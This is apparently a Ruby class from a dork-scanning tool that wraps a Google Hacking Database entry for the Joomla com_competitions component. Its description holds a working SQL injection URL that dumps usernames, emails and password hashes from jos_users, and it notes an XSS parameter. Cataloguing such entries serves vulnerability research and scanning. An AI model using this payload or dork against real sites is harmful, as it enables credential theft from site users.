module Dorks
   class Dork3620 < Vulpes::Dork

      def initialize
         super({
            name: "Dork 3620",
            ghdb_url: "https://www.exploit-db.com/ghdb/3620",
            severity: "5",
            category: "advisories_and_vulnerabilities",
            publish_date: "2010-11-25",
            author: "anonymous",
            dork: <<~EDORK,
inurl:"index.php?option=com_competitions"
EDORK
            description: <<~EDESC
SQL Injection: http://127.0.0.1/index.php?option=com_competitions&task=view&id=-9 union all select 1,2,3,4,group_concat(username,0x3a,email,0x3a,password),6,7 from jos_users-- and XSS: http://127.0.0.1/index.php?option=com_competitions&menu=XroGuE Author: Ashiyane Digital Security Team
EDESC
         })

      end
   end
end
